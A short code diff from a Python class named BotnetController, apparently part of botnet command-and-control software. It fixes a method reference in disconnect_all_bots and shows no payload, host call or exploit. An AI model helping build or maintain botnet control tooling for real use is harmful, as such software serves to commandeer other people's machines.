@@ -241,7 +241,7 @@ class BotnetController:
         return room.disconnect_bots()
 
     def disconnect_all_bots(self):
-        self.for_all_rooms(CommandRoom.disconnect_bot)
+        self.for_all_rooms(CommandRoom.disconnect_bots)
 
 
     def ping_loop(self):
